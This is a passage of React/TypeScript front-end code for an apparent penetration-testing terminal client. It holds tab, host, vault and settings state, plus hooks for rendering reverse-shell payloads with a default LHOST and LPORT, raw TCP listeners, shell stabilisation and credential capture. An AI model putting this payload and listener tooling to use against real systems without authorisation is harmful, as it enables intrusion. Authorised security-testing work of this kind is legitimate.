  } | null>(null);
  const [saveSelectionCredModal, setSaveSelectionCredModal] = useState<{
    isOpen: boolean;
    selectedText: string;
    hostId?: string;
  } | null>(null);
  const [saveSelectionEvidenceModal, setSaveSelectionEvidenceModal] = useState<{
    isOpen: boolean;
    selectedText: string;
    hostId?: string;
  } | null>(null);
  const [saveSelectionNoteModal, setSaveSelectionNoteModal] = useState<{
    isOpen: boolean;
    selectedText: string;
    hostId?: string;
  } | null>(null);
  const [saveSelectionFindingModal, setSaveSelectionFindingModal] = useState<{
    isOpen: boolean;
    selectedText: string;
    hostId?: string;
  } | null>(null);
  const [shellStabilizeModal, setShellStabilizeModal] = useState<{
    isOpen: boolean;
    sessionId: string;
    sessionTitle: string;
    isRawTcp: boolean;
    cols: number;
    rows: number;
  } | null>(null);

  // Host Sidebar Tag / Label filtering & editing
  const [selectedHostTag, setSelectedHostTag] = useState<string>('all');
  const [editingHostId, setEditingHostId] = useState<string | null>(null);
  const [editingIdentityId, setEditingIdentityId] = useState<string>('');
  const [showHostPass, setShowHostPass] = useState<boolean>(false);

  // Add Host form state
  const [hostLabel, setHostLabel] = useState<string>('');
  const [hostAddr, setHostAddr] = useState<string>('');
  const [hostPort, setHostPort] = useState<string>('0'); // 0 = inherit from group
  const [hostGroupId, setHostGroupId] = useState<string>('');
  const [hostUser, setHostUser] = useState<string>('');
  const [hostAuthMethod, setHostAuthMethod] = useState<string>('password');
  const [hostKeyId, setHostKeyId] = useState<string>('');
  const [hostPass, setHostPass] = useState<string>('');
  const [hostTags, setHostTags] = useState<string>('');
  const [hostColor, setHostColor] = useState<string>('');
  const [hostInitialDir, setHostInitialDir] = useState<string>('');
  const [hostProxyProfileId, setHostProxyProfileId] = useState<string>('');
  const [hostProxyCommand, setHostProxyCommand] = useState<string>('');
  const [hostProxyJump, setHostProxyJump] = useState<string>('');
  const [hostSessionLogging, setHostSessionLogging] = useState<boolean>(false);
  const [hostEngagementId, setHostEngagementId] = useState<string>('');

  const [address, setAddress] = useState<string>('');
  const [port, setPort] = useState<string>('22');
  const [username, setUsername] = useState<string>('root');
  const [password, setPassword] = useState<string>('');
  const [directAuthMethod, setDirectAuthMethod] = useState<'password' | 'key' | 'agent'>('password');
  const [directKeyId, setDirectKeyId] = useState<string>('');
  const [directKeyPassphrase, setDirectKeyPassphrase] = useState<string>('');
  const [tabs, setTabs] = useState<TabItem[]>([]);
  const [activeTabId, setActiveTabId] = useState<string | null>(null);
  const [draggedTabId, setDraggedTabId] = useState<string | null>(null);
  const [liveSessions, setLiveSessions] = useState<Set<string>>(new Set());
  const [connectingPaneIds, setConnectingPaneIds] = useState<Set<string>>(new Set());

  // Auto-Reconnect with Exponential Backoff & Workspace Session Restore (F-27)
  const tabsRef = useRef<TabItem[]>(tabs);
  useEffect(() => {
    tabsRef.current = tabs;
  }, [tabs]);

  const [reconnectStates, setReconnectStates] = useState<Map<string, ReconnectState>>(new Map());
  const reconnectStatesRef = useRef<Map<string, ReconnectState>>(new Map());
  const reconnectInFlightRef = useRef<Set<string>>(new Set());
  const reconnectTimersRef = useRef<Map<string, ReturnType<typeof setInterval>>>(new Map());
  const intentionalDisconnectsRef = useRef<Set<string>>(new Set());
  const saveWorkspaceTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const startAutoReconnectRef = useRef<((pane: PaneItem, tabId: string, attempt?: number, reason?: string) => void) | null>(null);
  const performReconnectRef = useRef<((paneId: string) => Promise<void>) | null>(null);
  const [statusMessage, setStatusMessage] = useState<string>(
    initialLocked
      ? 'Vault is locked (Dark Crimson Theme). Unlock your vault to switch to Teal and access saved hosts.'
      : 'Vault is unlocked (Teal Theme).'
  );
  const [hostKeyPrompt, setHostKeyPrompt] = useState<HostKeyPromptInfo | null>(null);

  // Top Bar Dropdowns & Tab Groups state (F-09)
  const [activeDropdownMenu, setActiveDropdownMenu] = useState<NavDropdownMenu | null>(
    null
  );
  const [groupTabsByHost, setGroupTabsByHost] = useState<boolean>(false);
  const [collapsedHostGroups, setCollapsedHostGroups] = useState<Set<string>>(new Set());

  const toggleHostGroupCollapse = (groupKey: string): void => {
    setCollapsedHostGroups((prev) => {
      const next = new Set(prev);
      if (next.has(groupKey)) {
        next.delete(groupKey);
      } else {
        next.add(groupKey);
      }
      return next;
    });
  };

  // Serial / UART and Local Terminal State (F-23)
  const [showSerialModal, setShowSerialModal] = useState<boolean>(false);
  const [serialPorts, setSerialPorts] = useState<SerialPortInfo[]>([]);
  const [serialLoading, setSerialLoading] = useState<boolean>(false);
  const [showSerialAdvanced, setShowSerialAdvanced] = useState<boolean>(false);
  const [serialConfig, setSerialConfig] = useState<SerialConfig>({
    port: 'COM1',
    baudRate: 115200,
    dataBits: 8,
    parity: 'none',
    stopBits: '1',
    flowControl: 'none',
    dtr: true,
    rts: true,
    localEcho: false,
    lineEnding: 'crlf',
  });
  const [serialPinStates, setSerialPinStates] = useState<
    Map<string, { dtr: boolean; rts: boolean }>
  >(new Map());

  // Global Settings state
  const [globalSettings, setGlobalSettings] = useState<AppGlobalSettings>(() => {
    const loaded = loadSettingsFromStorage();
    return initialSettings ? { ...loaded, ...initialSettings } : loaded;
  });
  const globalSettingsRef = useRef<AppGlobalSettings>(globalSettings);
  useEffect(() => {
    globalSettingsRef.current = globalSettings;
    if (typeof document !== 'undefined') {
      document.body.classList.toggle('perf-low-latency', Boolean(globalSettings.lowLatencyMode));
    }
  }, [globalSettings]);

  // Auto-enable Low-Latency / RDP Mode on Linux xrdp or unavailable DRI GPU
  // unless the user has explicitly persisted a preference.
  useEffect(() => {
    if (initialSettings?.lowLatencyMode !== undefined || hasExplicitLowLatencySetting()) {
      return;
    }
    const api = getWailsBindings();
    if (!api?.IsRemoteDisplayEnvironment) {
      return;
    }
    let active = true;
    void api
      .IsRemoteDisplayEnvironment()
      .then((isRemote) => {
        if (!active || !isRemote) return;
        setGlobalSettings((prev) => {
          if (prev.lowLatencyMode) return prev;
          const next: AppGlobalSettings = { ...prev, lowLatencyMode: true, terminalBg: 'none' };
          applySettingsToAllTerminals(next);
          return next;
        });
      })
      .catch(() => {
        // ignore detection errors
      });
    return () => {
      active = false;
    };
  }, [initialSettings?.lowLatencyMode]);
  const [showGlobalSettingsModal, setShowGlobalSettingsModal] = useState<boolean>(false);
  const [settingsActiveTab, setSettingsActiveTab] = useState<SettingsTabId>('appearance');
  const [paneFontSizes, setPaneFontSizes] = useState<Map<string, number>>(new Map());
  const [leaderArmed, setLeaderArmed] = useState<boolean>(false);
  const leaderTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const quickConnectInputRef = useRef<HTMLInputElement>(null);

  // Ephemeral Remote Companion Agent Execution Context (F-46)
  const [remoteExecContext, setRemoteExecContext] = useState<RemoteExecutionContext>({
    mode: 'local',
    attachedAgents: [],
  });
  const [attachingAgentSessionId, setAttachingAgentSessionId] = useState<string | null>(null);
  const [showRemoteDirPicker, setShowRemoteDirPicker] = useState<boolean>(false);

  const syncContextDependentState = useCallback(async (): Promise<void> => {
    const api = getWailsBindings();
    if (api?.GetLocalNetworkIPs) {
      try {
        const ips = await api.GetLocalNetworkIPs();
        if (Array.isArray(ips) && ips.length > 0) {
          setSidebarTransferLhost(ips[0].ip);
          setSidebarPayloadLhost(ips[0].ip);
        }
      } catch {
        // ignore
      }
    }
    if (api?.GetDefaultStagingDirectory) {
      try {
        const defDir = await api.GetDefaultStagingDirectory();
        if (defDir && defDir.trim()) {
          const clean = defDir.trim();
          setSidebarTransferDir(clean);
          if (api.ListHostedTransferFiles) {
            const files = await api.ListHostedTransferFiles(clean);
            setSidebarTransferFiles(files || []);
          }
        }
      } catch {
        // ignore
      }
    }
  }, []);

  useEffect(() => {
    const api = getWailsBindings();
    if (api?.GetRemoteExecutionContext) {
      void api
        .GetRemoteExecutionContext()
        .then((ctx) => {
          if (ctx) setRemoteExecContext(ctx);
        })
        .catch(() => {});
    }
    const rt = getWailsRuntime();
    if (!rt?.EventsOn) return;
    const off = rt.EventsOn('remote-agent:updated', (raw: unknown) => {
      if (raw && typeof raw === 'object') {
        setRemoteExecContext(raw as RemoteExecutionContext);
        void syncContextDependentState();
      }
    });
    return () => {
      if (typeof off === 'function') off();
    };
  }, [syncContextDependentState]);

  // Vault File Sync & Conflict State (F-29)
  const [syncInfo, setSyncInfo] = useState<VaultSyncInfo | null>(null);
  const [showConflictModal, setShowConflictModal] = useState<boolean>(false);
  const [activeConflictReport, setActiveConflictReport] = useState<VaultConflictReport | null>(null);
  const [activeConflictFilePath, setActiveConflictFilePath] = useState<string | undefined>(undefined);

  // Port Forwarding & Tunnels State (F-13)
  const [showPortForwardingModal, setShowPortForwardingModal] = useState<boolean>(false);
  const [forwardingModalHostId, setForwardingModalHostId] = useState<string | undefined>(undefined);
  const [forwardRules, setForwardRules] = useState<ForwardRule[]>([]);
  const [activeTunnels, setActiveTunnels] = useState<ForwardTunnelStatus[]>([]);

  // Proxy Profiles & Proxychains Export State (F-14)
  const [showProxyProfilesModal, setShowProxyProfilesModal] = useState<boolean>(false);
  const [showProxychainsExportModal, setShowProxychainsExportModal] = useState<boolean>(false);
  const [proxychainsOptions, setProxychainsOptions] = useState<ProxychainsExportOptions | undefined>(undefined);

  useEffect(() => {
    if (activeSidebarPanel !== 'payloads' || !sidebarSelectedPayloadId) {
      setSidebarPayloadPreview(null);
      return;
    }
    const api = getWailsBindings();
    if (!api?.RenderPayload) return;
    let active = true;
    void api.RenderPayload({
      templateId: sidebarSelectedPayloadId,
      lhost: sidebarPayloadLhost || '10.10.14.1',
      lport: Number(sidebarPayloadLport) || 443,
      encoding: sidebarPayloadEncoding,
    }).then((res) => {
      if (active) setSidebarPayloadPreview(res);
    }).catch(() => {
      if (active) setSidebarPayloadPreview(null);
    });
    return () => {
      active = false;
    };
  }, [activeSidebarPanel, sidebarSelectedPayloadId, sidebarPayloadLhost, sidebarPayloadLport, sidebarPayloadEncoding]);

  // Snippets State (F-15)
  const [externalSnippets, setExternalSnippets] = useState<Snippet[]>([]);
  const [showSnippetsModal, setShowSnippetsModal] = useState<boolean>(false);
  const [runModalSnippet, setRunModalSnippet] = useState<Snippet | null>(null);
  const [runModalContext, setRunModalContext] = useState<SnippetContext | null>(null);
  const [runModalMode, setRunModalMode] = useState<'run' | 'insert'>('run');
  const [snippetActiveSessionId, setSnippetActiveSessionId] = useState<string>('');
  const [snippetPrefillBody, setSnippetPrefillBody] = useState<string>('');

  // Snippet Chains State (F-16)
  const [chains, setChains] = useState<SnippetChain[]>([]);
  const [showChainsModal, setShowChainsModal] = useState<boolean>(false);
  const [chainsHostFilter, setChainsHostFilter] = useState<string | null>(null);
  const [runnerModalChain, setRunnerModalChain] = useState<SnippetChain | null>(null);
  const [runnerModalContext, setRunnerModalContext] = useState<SnippetContext | null>(null);
  const [runnerActiveSessionId, setRunnerActiveSessionId] = useState<string>('');

  // TOTP Authenticator Generator State (F-20)
  const [showTotpModal, setShowTotpModal] = useState<boolean>(false);
  const [showTotpQuickSelector, setShowTotpQuickSelector] = useState<boolean>(false);
  const [totpTokensList, setTotpTokensList] = useState<TotpSummary[]>([]);

  // Host Notes & Markdown Documentation State (F-17)
  const [notes, setNotes] = useState<NotePage[]>([]);
  const [showNotesModal, setShowNotesModal] = useState<boolean>(false);
  const [notesModalHostId, setNotesModalHostId] = useState<string | undefined>(undefined);
  const [notesModalInitialNoteId, setNotesModalInitialNoteId] = useState<string | null>(null);
  const [openNotesDrawerHostId, setOpenNotesDrawerHostId] = useState<string | null>(null);

  // Session Logging State (F-21)
  const [showSessionLogsModal, setShowSessionLogsModal] = useState<boolean>(false);
  const [sessionLogs, setSessionLogs] = useState<SessionLogRecord[]>([]);
  const [activeLogSessions, setActiveLogSessions] = useState<Set<string>>(new Set());
  const localLogTranscriptsRef = useRef<Map<string, string>>(new Map());

  // Broadcast / Multi-Execution Input State (F-26)
  const [broadcastState, setBroadcastState] = useState<BroadcastState>({
    enabled: false,
    scope: 'tab',
    customSessionIds: [],
  });

  // Workspace Drag-and-Drop, Split Resizing & View Builder State
  const [workspaceDragItem, setWorkspaceDragItem] = useState<WorkspaceDragPayload | null>(null);
  const workspaceDragRef = useRef<WorkspaceDragPayload | null>(null);
  const [dropTargetIndicator, setDropTargetIndicator] = useState<{
    paneId: string;
    zone: DropZonePosition;
  } | null>(null);
  const [activeSplitResize, setActiveSplitResize] = useState<{
    tabId: string;
    splitId: string;
    direction: 'horizontal' | 'vertical';
    index: number;
    startPos: number;
    containerSize: number;
    initialRatios: number[];
  } | null>(null);
  const [showAddToViewMenu, setShowAddToViewMenu] = useState<boolean>(false);
  const [addToViewZone, setAddToViewZone] = useState<Exclude<DropZonePosition, 'center'>>('right');
  const [quickConnectExpanded, setQuickConnectExpanded] = useState<boolean>(false);

  const startWorkspaceDrag = useCallback((payload: WorkspaceDragPayload | null): void => {
    workspaceDragRef.current = payload;
    setWorkspaceDragItem(payload);
    if (!payload) {
      setDropTargetIndicator(null);
    }
  }, []);

  // Terminal Search state (F-11)
  const [searchOpenPanes, setSearchOpenPanes] = useState<Set<string>>(new Set());
  const [paneSearchStates, setPaneSearchStates] = useState<
    Map<
      string,
      {
        query: string;
        caseSensitive: boolean;
        wholeWord: boolean;
        regex: boolean;
        resultFound: boolean | null;
      }
    >
  >(new Map());

  const togglePaneSearch = useCallback((sid: string): void => {
    setSearchOpenPanes((prev) => {
      const next = new Set(prev);
      if (next.has(sid)) {
        next.delete(sid);
        clearTerminalSearch(sid);
        focusersRef.current.get(sid)?.();
      } else {
        next.add(sid);
      }
      return next;
    });
  }, []);

  const closePaneSearch = useCallback((sid: string): void => {
    setSearchOpenPanes((prev) => {
      const next = new Set(prev);
      next.delete(sid);
      return next;
    });
    clearTerminalSearch(sid);
    focusersRef.current.get(sid)?.();
  }, []);

  const updatePaneSearchState = useCallback(
    (
      sid: string,
      partial: Partial<{
        query: string;
        caseSensitive: boolean;
        wholeWord: boolean;
        regex: boolean;
        resultFound: boolean | null;
      }>
    ): void => {
      setPaneSearchStates((prev) => {
        const next = new Map(prev);
        const curr = next.get(sid) || {
          query: '',
          caseSensitive: false,
          wholeWord: false,
          regex: false,
          resultFound: null,
        };
        next.set(sid, { ...curr, ...partial });
        return next;
      });
    },
    []
  );

  const executePaneSearch = useCallback(
    (
      sid: string,
      direction: 'next' | 'prev',
      stateOverride?: Partial<{
        query: string;
        caseSensitive: boolean;
        wholeWord: boolean;
        regex: boolean;
        resultFound: boolean | null;
      }>
    ): void => {
      const curr = {
        ...(paneSearchStates.get(sid) || {
          query: '',
          caseSensitive: false,
          wholeWord: false,
          regex: false,
          resultFound: null,
        }),
        ...stateOverride,
      };
      if (!curr.query) {
        clearTerminalSearch(sid);
        updatePaneSearchState(sid, { resultFound: null });
        return;
      }
      const fn = direction === 'next' ? searchTerminalNext : searchTerminalPrevious;
      const found = fn(sid, curr.query, {
        caseSensitive: curr.caseSensitive,
        wholeWord: curr.wholeWord,
        regex: curr.regex,
        incremental: true,
      });
      updatePaneSearchState(sid, { resultFound: found });
    },
    [paneSearchStates, updatePaneSearchState]
  );

  const handleUpdateSettings = (partial: Partial<AppGlobalSettings>): void => {
    setGlobalSettings((prev) => {
      const next = { ...prev, ...partial };
      saveSettingsToStorage(next);
      applySettingsToAllTerminals(next);
      return next;
    });
  };

  const handleResetSettings = (): void => {
    setGlobalSettings(DEFAULT_SETTINGS);
    saveSettingsToStorage(DEFAULT_SETTINGS);
    applySettingsToAllTerminals(DEFAULT_SETTINGS);
    setPaneFontSizes(new Map());
    setStatusMessage('Global settings restored to defaults.');
  };

  const activeTab = tabs.find((t) => t.id === activeTabId) || tabs[0] || null;
  const activeTabPanes = activeTab ? collectPanes(activeTab.rootNode) : [];
  const activePane =
    activeTabPanes.find((p) => p.id === activeTab?.activePaneId) || activeTabPanes[0] || null;
  const sessionId =
    activePane && (!activePane.paneType || activePane.paneType === 'terminal')
      ? activePane.sessionId
      : null;

  const writersRef = useRef<Map<string, (chunk: string) => void>>(new Map());
  const pendingDataBuffers = useRef<Map<string, string[]>>(new Map());
  const focusersRef = useRef<Map<string, () => void>>(new Map());
  const tabCounterRef = useRef<number>(0);
  const targetLauncherRef = useRef<{ tabId: string; paneId: string } | null>(null);

  const openSessionTab = useCallback(
    (newSessionId: string, title: string, hostId?: string, explicitColor?: string): void => {
      setLiveSessions((prev) => new Set(prev).add(newSessionId));
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const paneId = `pane-${seq}-1`;
      const color = getEffectiveHostColor(hostId, explicitColor, title);
      const explicitLauncherTarget = targetLauncherRef.current;
      targetLauncherRef.current = null;

      setTabs((prev) => {
        const targetTab = explicitLauncherTarget
          ? prev.find((t) => t.id === explicitLauncherTarget.tabId)
          : prev.find((t) => {
            const ap = collectPanes(t.rootNode).find((p) => p.id === t.activePaneId);
            return ap?.paneType === 'launcher';
          });

        if (targetTab) {
          const targetPaneId = explicitLauncherTarget
            ? explicitLauncherTarget.paneId
            : targetTab.activePaneId;
          const replacementPane: Extract<WorkspaceNode, { type: 'pane' }> = {
            type: 'pane',
            id: paneId,
            sessionId: newSessionId,
            hostId,
            title,
            paneType: 'terminal',
          };
          const wasSingleLauncherPane =
            targetTab.rootNode.type === 'pane' && targetTab.rootNode.id === targetPaneId;
          const updatedRoot = replacePaneInTree(targetTab.rootNode, targetPaneId, replacementPane);
          setActiveTabId(targetTab.id);
          return prev.map((t) =>
            t.id === targetTab.id
              ? {
                ...t,
                title: wasSingleLauncherPane || t.title === 'New Connection' ? title : t.title,
                hostId: wasSingleLauncherPane || !t.hostId ? hostId : t.hostId,
                color: wasSingleLauncherPane ? color : t.color,
                rootNode: updatedRoot,
                activePaneId: paneId,
              }
              : t
          );
        }

        const tabId = `tab-${seq}`;
        const newTab: TabItem = {
          id: tabId,
          title,
          hostId,
          color,
          rootNode: {
            type: 'pane',
            id: paneId,
            sessionId: newSessionId,
            hostId,
            title,
          },
          activePaneId: paneId,
        };
        setActiveTabId(tabId);
        return [...prev, newTab];
      });
    },
    []
  );

  const openSftpTab = useCallback(
    (sshSessionId: string, title: string, hostId?: string): void => {
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const tabId = `sftp-tab-${seq}`;
      const paneId = `sftp-pane-${seq}-1`;
      const color = getEffectiveHostColor(hostId, undefined, title);
      const newTab: TabItem = {
        id: tabId,
        title: `SFTP: ${title}`,
        hostId,
        color,
        tabType: 'sftp',
        sftpSessionId: sshSessionId,
        rootNode: {
          type: 'pane',
          id: paneId,
          sessionId: `sftp-${sshSessionId}`,
          hostId,
          title: `SFTP: ${title}`,
        },
        activePaneId: paneId,
      };
      setTabs((prev) => [...prev, newTab]);
      setActiveTabId(tabId);
    },
    []
  );

  const openSettingsTab = useCallback(
    (subTab: SettingsTabId = 'appearance'): void => {
      setSettingsActiveTab(subTab);
      setTabs((prev) => {
        const existingTab = prev.find((t) => t.tabType === 'settings');
        if (existingTab) {
          setActiveTabId(existingTab.id);
          return prev;
        }
        tabCounterRef.current += 1;
        const seq = tabCounterRef.current;
        const tabId = `settings-tab-${seq}`;
        const paneId = `settings-pane-${seq}-1`;
        const newTab: TabItem = {
          id: tabId,
          title: 'Settings',
          color: '#2dd4bf',
          tabType: 'settings',
          rootNode: {
            type: 'pane',
            id: paneId,
            sessionId: `settings-${seq}`,
            title: 'Settings',
          },
          activePaneId: paneId,
        };
        setActiveTabId(tabId);
        return [...prev, newTab];
      });
    },
    []
  );

  const openNotesTab = useCallback(
    (hostId?: string, noteId?: string | null): void => {
      setTabs((prev) => {
        const existingTab = prev.find((t) => t.tabType === 'notes');
        if (existingTab) {
          existingTab.notesHostId = hostId;
          existingTab.notesInitialNoteId = noteId;
          setActiveTabId(existingTab.id);
          return [...prev];
        }
        tabCounterRef.current += 1;
        const seq = tabCounterRef.current;
        const tabId = `notes-tab-${seq}`;
        const paneId = `notes-pane-${seq}-1`;
        const newTab: TabItem = {
          id: tabId,
          title: 'Notes',
          color: '#38bdf8',
          tabType: 'notes',
          notesHostId: hostId,
          notesInitialNoteId: noteId,
          rootNode: {
            type: 'pane',
            id: paneId,
            sessionId: `notes-${seq}`,
            title: 'Notes',
          },
          activePaneId: paneId,
        };
        setActiveTabId(tabId);
        return [...prev, newTab];
      });
    },
    []
  );

  const openNetworkMapTab = useCallback((): void => {
    setTabs((prev) => {
      const existingTab = prev.find((t) => t.tabType === 'network-map');
      if (existingTab) {
        setActiveTabId(existingTab.id);
        return prev;
      }
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const tabId = `netmap-tab-${seq}`;
      const paneId = `netmap-pane-${seq}-1`;
      const newTab: TabItem = {
        id: tabId,
        title: 'Network Map',
        color: '#2dd4bf',
        tabType: 'network-map',
        rootNode: {
          type: 'pane',
          id: paneId,
          sessionId: `netmap-${seq}`,
          title: 'Network Topology Map',
          paneType: 'network-map',
        },
        activePaneId: paneId,
      };
      setActiveTabId(tabId);
      return [...prev, newTab];
    });
  }, []);

  const openWinrmTab = useCallback((): void => {
    setTabs((prev) => {
      const existingTab = prev.find((t) => t.tabType === 'winrm');
      if (existingTab) {
        setActiveTabId(existingTab.id);
        return prev;
      }
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const tabId = `winrm-tab-${seq}`;
      const paneId = `winrm-pane-${seq}-1`;
      const newTab: TabItem = {
        id: tabId,
        title: 'WinRM // PSRemoting',
        color: '#38bdf8',
        tabType: 'winrm',
        rootNode: {
          type: 'pane',
          id: paneId,
          sessionId: `winrm-${seq}`,
          title: 'WinRM PowerShell Remoting',
        },
        activePaneId: paneId,
      };
      setActiveTabId(tabId);
      return [...prev, newTab];
    });
  }, []);

  const openRouteHealthTab = useCallback((): void => {
    refreshRouteHealthEndpoints();
    setTabs((prev) => {
      const existingTab = prev.find((t) => t.tabType === 'route-health');
      if (existingTab) {
        setActiveTabId(existingTab.id);
        return prev;
      }
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const tabId = `route-health-tab-${seq}`;
      const paneId = `route-health-pane-${seq}-1`;
      const newTab: TabItem = {
        id: tabId,
        title: 'Route Health Dashboard',
        color: '#10b981',
        tabType: 'route-health',
        rootNode: {
          type: 'pane',
          id: paneId,
          sessionId: `route-health-${seq}`,
          title: 'Route Health & Listeners Dashboard',
        },
        activePaneId: paneId,
      };
      setActiveTabId(tabId);
      return [...prev, newTab];
    });
  }, [refreshRouteHealthEndpoints]);

  useEffect(() => {
    if (activeTab?.tabType === 'route-health') {
      refreshRouteHealthEndpoints();
    }
  }, [activeTab?.tabType, refreshRouteHealthEndpoints]);

  const openApiTesterTab = useCallback((): void => {
    setTabs((prev) => {
      const existingTab = prev.find((t) => t.tabType === 'api-tester');
      if (existingTab) {
        setActiveTabId(existingTab.id);
        return prev;
      }
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const tabId = `api-tester-tab-${seq}`;
      const paneId = `api-tester-pane-${seq}-1`;
      const newTab: TabItem = {
        id: tabId,
        title: 'API Tester & Repeater',
        color: '#38bdf8',
        tabType: 'api-tester',
        rootNode: {
          type: 'pane',
          id: paneId,
          sessionId: `api-tester-${seq}`,
          title: 'API Tester & HTTP Repeater',
        },
        activePaneId: paneId,
      };
      setActiveTabId(tabId);
      return [...prev, newTab];
    });
  }, []);

  const openHexRunnerTab = useCallback((): void => {
    setTabs((prev) => {
      const existingTab = prev.find((t) => t.tabType === 'hex-runner');
      if (existingTab) {
        setActiveTabId(existingTab.id);
        return prev;
      }
      tabCounterRef.current += 1;
      const seq = tabCounterRef.current;
      const tabId = `hex-runner-tab-${seq}`;
      const paneId = `hex-runner-pane-${seq}-1`;
      const newTab: TabItem = {
        id: tabId,
        title: 'Binary / Hex Runner',
        color: '#f59e0b',
        tabType: 'hex-runner',
        rootNode: {
          type: 'pane',
          id: paneId,
          sessionId: `hex-runner-${seq}`,
          title: 'Binary / Hex Payload Runner (No-PTY)',
        },
        activePaneId: paneId,
      };
      setActiveTabId(tabId);
      return [...prev, newTab];
    });
  }, []);

  const openRemoteEditorTab = useCallback(
    (session: RemoteEditSession, hostId?: string): void => {
      setTabs((prev) => {
        const existingTab = prev.find((t) => t.editSessionId === session.id);
        if (existingTab) {
          setActiveTabId(existingTab.id);
          return prev;
        }
        tabCounterRef.current += 1;
        const seq = tabCounterRef.current;
        const tabId = `editor-tab-${seq}`;
        const paneId = `editor-pane-${seq}-1`;
        const fileName = session.filename || session.remotePath.split('/').pop() || 'File';
        const color = getEffectiveHostColor(hostId, undefined, fileName);
        const newTab: TabItem = {
          id: tabId,
          title: `Edit: ${fileName}`,
          hostId,
          color,
          tabType: 'editor',
          editSessionId: session.id,
          editRemotePath: session.remotePath,
          rootNode: {
            type: 'pane',
            id: paneId,
            sessionId: `editor-${session.id}`,
            hostId,
            title: `Edit: ${fileName}`,
            paneType: 'editor',
            editSessionId: session.id,
            editRemotePath: session.remotePath,
          },
          activePaneId: paneId,
        };
        setActiveTabId(tabId);
        return [...prev, newTab];
      });
    },
    []
  );

  const refreshRawTcpListeners = useCallback(async (): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.ListRawTcpListeners) return;
    try {
      const list = await api.ListRawTcpListeners();
      setRawTcpListeners(list || []);
    } catch {
      // ignore
    }
  }, []);

  const handleConnectRawTcp = useCallback(async (cfg: RawTcpConfig): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.ConnectRawTcp) {
      throw new Error('Raw TCP service unavailable in this environment.');
    }
    const sessionId = await api.ConnectRawTcp(cfg);
    setLiveSessions((prev) => new Set(prev).add(sessionId));

    tabCounterRef.current += 1;
    const seq = tabCounterRef.current;
    const tabId = `rawtcp-tab-${seq}`;
    const paneId = `rawtcp-pane-${seq}-1`;
    const title = `TCP: ${cfg.host}:${cfg.port}`;
    const color = '#00f0ff';

    const newTab: TabItem = {
      id: tabId,
      title,
      color,
      tabType: 'terminal',
      activePaneId: paneId,
      rootNode: {
        type: 'pane',
        id: paneId,
        sessionId,
        title,
        paneType: 'terminal',
        isRawTcp: true,
        rawTcpHost: cfg.host,
        rawTcpPort: cfg.port,
        initialLineMode: cfg.lineMode,
        initialLineEnding: cfg.lineEnding,
      },
    };

    setTabs((prev) => [...prev, newTab]);
    setActiveTabId(tabId);
  }, []);

  const handleStartRawTcpListener = useCallback(async (cfg: RawTcpListenerConfig): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.StartRawTcpListener) {
      throw new Error('Raw TCP listener service unavailable.');
    }
    await api.StartRawTcpListener(cfg);
    await refreshRawTcpListeners();
  }, [refreshRawTcpListeners]);

  const handleStopRawTcpListener = useCallback(async (id: string): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.StopRawTcpListener) return;
    await api.StopRawTcpListener(id);
    await refreshRawTcpListeners();
  }, [refreshRawTcpListeners]);

  const getActiveSessionHostIds = useCallback((): string[] => {
    const ids = new Set<string>();
    for (const t of tabs) {
      const panes = collectPanes(t.rootNode);
      for (const p of panes) {
        if (
          p.hostId &&
          (!p.paneType || p.paneType === 'terminal') &&
          !p.sessionId.startsWith('restored-')
        ) {
          ids.add(p.hostId);
        }
      }
    }
    return Array.from(ids);
  }, [tabs]);

  const registerWriter = useCallback((id: string, writeFn: (chunk: string) => void) => {
    writersRef.current.set(id, writeFn);
    const buffered = pendingDataBuffers.current.get(id);
    if (buffered && buffered.length > 0) {
      for (const chunk of buffered) {
        writeFn(chunk);
      }
      pendingDataBuffers.current.delete(id);
    }
  }, []);

  const registerFocuser = useCallback((id: string, focusFn: () => void) => {
    focusersRef.current.set(id, focusFn);
  }, []);

  const refreshVaultState = useCallback(async (): Promise<void> => {
    const api = getWailsBindings();
    if (!api) {
      return;
    }
    try {
      const st = await api.HealthCheck();
      if (st.vaultLocked && (st.passwordless || !st.vaultInitialized)) {
        try {
          if (!st.vaultInitialized) {
            await api.InitializeVault('');
          } else {
            await api.UnlockVault('');
          }
          const updatedSt = await api.HealthCheck();
          setVaultLocked(updatedSt.vaultLocked);
          setVaultInitialized(updatedSt.vaultInitialized);
          setPasswordless(updatedSt.passwordless);
          setQuickUnlockReady(updatedSt.quickUnlockReady);
          if (!updatedSt.vaultLocked) {
            const summary = await api.GetVaultSummary();
            setVaultSummary(summary);
            if (api.ListNotes) {
              const allNotes = await api.ListNotes('all');
              setNotes(allNotes || []);
            }
            if (api.GetVaultSyncInfo) {
              api.GetVaultSyncInfo().then(setSyncInfo).catch(() => { });
            }
            if (api.ListEngagements) {
              api.ListEngagements().then(setEngagementsList).catch(() => { });
            }
            if (api.GetActiveEngagement) {
              api.GetActiveEngagement().then(setActiveEngagement).catch(() => { });
            }
            if (api.ListSnippetChains) {
              api.ListSnippetChains('').then(setChains).catch(() => { });
            }
            if (api.ListSnippetsFromFile) {
              api.ListSnippetsFromFile().then(setExternalSnippets).catch(() => { });
            }
          }
          return;
        } catch {
          // ignore auto-unlock errors
        }
      }
      setVaultLocked(st.vaultLocked);
      setVaultInitialized(st.vaultInitialized);
      setPasswordless(st.passwordless);
      setQuickUnlockReady(st.quickUnlockReady);
      if (!st.vaultLocked) {
        const summary = await api.GetVaultSummary();
        setVaultSummary(summary);
        if (api.ListNotes) {
          const allNotes = await api.ListNotes('all');
          setNotes(allNotes || []);
        }
        if (api.GetVaultSyncInfo) {
          api.GetVaultSyncInfo().then(setSyncInfo).catch(() => { });
        }
        if (api.ListEngagements) {
          api.ListEngagements().then(setEngagementsList).catch(() => { });
        }
        if (api.GetActiveEngagement) {
          api.GetActiveEngagement().then(setActiveEngagement).catch(() => { });
        }
        if (api.ListSnippetChains) {
          api.ListSnippetChains('').then(setChains).catch(() => { });
        }
        if (api.ListSnippetsFromFile) {
